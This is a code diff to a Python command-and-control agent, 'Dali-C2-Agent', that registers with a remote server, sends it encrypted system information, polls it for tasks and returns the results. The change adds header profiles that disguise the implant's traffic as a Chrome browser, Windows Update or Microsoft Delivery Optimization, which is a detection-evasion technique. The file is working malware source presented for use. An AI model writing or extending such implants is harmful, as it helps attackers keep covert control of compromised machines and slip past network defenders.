@@ -42,13 +42,26 @@ def get_agent_id():
 class DaliAgent:
     def __init__(self):
         self.agent_id = get_agent_id()
-        print(f"[*] Initializing agent with ID: {self.agent_id}")
+        self.identity = os.getenv("AGENT_IDENTITY", "agent")
+        self.headers = self._get_identity_headers()
+        print(f"[*] Initializing agent [{self.identity}] with ID: {self.agent_id}")
+
+    def _get_identity_headers(self):
+        profiles = {
+            "browser": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "updater": "Microsoft-Delivery-Optimization/10.0",
+            "legit_service": "Windows-Update-Agent/10.0.19041.1",
+            "agent": f"Dali-C2-Agent/{VERSION}"
+        }
+        ua = profiles.get(self.identity, profiles["agent"])
+        return {"User-Agent": ua}
 
     async def register(self):
-        print(f"[*] Registering agent: {self.agent_id}")
+        print(f"[*] Registering as {self.identity}: {self.agent_id}")
         
         # Gather initial info via sysinfo plugin
         info = Executor._get_sysinfo()
+        info["identity_profile"] = self.identity
         
         payload = {
             "agent_id": self.agent_id,
@@ -57,15 +70,13 @@ class DaliAgent:
         }
         
         try:
-            # Encrypt registration data
             encrypted_data = encrypt_payload(payload)
-            async with httpx.AsyncClient() as client:
+            async with httpx.AsyncClient(headers=self.headers) as client:
                 response = await client.post(
                     f"{SERVER_URL}/register", 
                     json={"data": encrypted_data}
                 )
                 if response.status_code == 200:
-                    # Decrypt server response if needed (though status is enough)
                     resp_json = response.json()
                     server_data = decrypt_payload(resp_json.get("data", ""))
                     print(f"[+] Server response: {server_data.get('status')}")
@@ -76,10 +87,9 @@ class DaliAgent:
 
     async def poll_tasks(self):
         try:
-            async with httpx.AsyncClient() as client:
+            async with httpx.AsyncClient(headers=self.headers) as client:
                 response = await client.get(f"{SERVER_URL}/tasks/{self.agent_id}")
                 if response.status_code == 200:
-                    # Decrypt task list from server
                     resp_json = response.json()
                     server_data = decrypt_payload(resp_json.get("data", ""))
                     tasks_data = server_data.get("tasks", [])
@@ -98,7 +108,7 @@ class DaliAgent:
         }
         try:
             encrypted_data = encrypt_payload(payload)
-            async with httpx.AsyncClient() as client:
+            async with httpx.AsyncClient(headers=self.headers) as client:
                 await client.post(
                     f"{SERVER_URL}/tasks/{self.agent_id}/results", 
                     json={"data": encrypted_data}
@@ -110,7 +120,7 @@ class DaliAgent:
         await self.register()
         while True:
             await self.poll_tasks()
-            await asyncio.sleep(5)  # Poll every 5 seconds
+            await asyncio.sleep(5)
 
 if __name__ == "__main__":
     try:
